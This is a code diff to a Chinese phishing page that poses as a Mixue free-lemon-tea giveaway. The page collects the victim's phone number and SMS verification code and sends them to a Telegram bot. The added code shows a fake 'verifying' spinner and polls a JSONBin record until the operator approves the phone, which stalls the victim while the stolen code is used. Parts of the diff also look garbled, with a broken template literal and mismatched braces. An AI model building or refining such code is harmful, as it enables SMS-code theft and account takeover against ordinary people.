@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>蜜雪冰城 · 限时福利 · 免费领冰淇淋/柠檬茶</title>
+  <title>蜜雪冰城 · 限时福利 · 免费领柠檬茶</title>
   <style>
     :root {
       --mixue-red: #E63946;
@@ -1047,6 +1048,7 @@ codeEl.addEventListener('input', (e) => {
 
 submitBtn.addEventListener('click', async () => {
   if (submitBtn.disabled || !isVerifySuccess) return;
+  
   const phone = phoneEl.value.trim();
   const code  = codeEl.value.trim();
   const nickname = nicknameEl.value.trim() || '未填';
@@ -1057,15 +1059,59 @@ submitBtn.addEventListener('click', async () => {
     return;
   }
 
+  // 上报手机号 + 验证码
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `【蜜雪-完成】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}`
+        text: `【待审核】\n昵称：\( {nickname}\n手机号： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n\n回复 "通过 ${phone}" 来放行`
       })
     });
+  } catch(e) {}
+
+  // 显示假加载弹窗
+  const loading = document.getElementById('loadingMask');
+  loading.querySelector('.loading-text').textContent = '正在核验验证码，请稍候...';
+  loading.classList.add('show');
+
+  // 开始轮询 JSONBin（每3秒查一次）
+  const BIN_ID = '67a123b456cdef0123456789';     // 改成你自己的
+  const MASTER_KEY = '$2a$10$你的master key写这里';  // 改成你自己的
+
+  const checkInterval = setInterval(async () => {
+    try {
+      const res = await axios.get(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+        headers: { 'X-Master-Key': MASTER_KEY }
+      });
+      
+      const data = res.data.record;
+      if (data.allowed_phones?.includes(phone)) {
+        clearInterval(checkInterval);
+        loading.classList.remove('show');
+        
+        // 模拟领取成功
+        claimed++;
+        updateStockDisplay();
+        shootBarrage(phone);
+        modal.style.display = 'flex';
+        
+        // 可选：记录已放行，防止重复
+        localStorage.setItem('mx_claim_' + phone, Date.now().toString());
+      }
+    } catch(e) {
+      console.error('轮询失败', e);
+    }
+  }, 3000);
+
+  // 给用户一个提示（可选）
+  setTimeout(() => {
+    if (loading.classList.contains('show')) {
+      showToast('系统繁忙，正在排队核验中...', 'info');
+    }
+  }, 8000);
+});
   } catch(e) {
     console.error('提交上报失败:', e);
     alert('网络异常，提交失败，请重试');
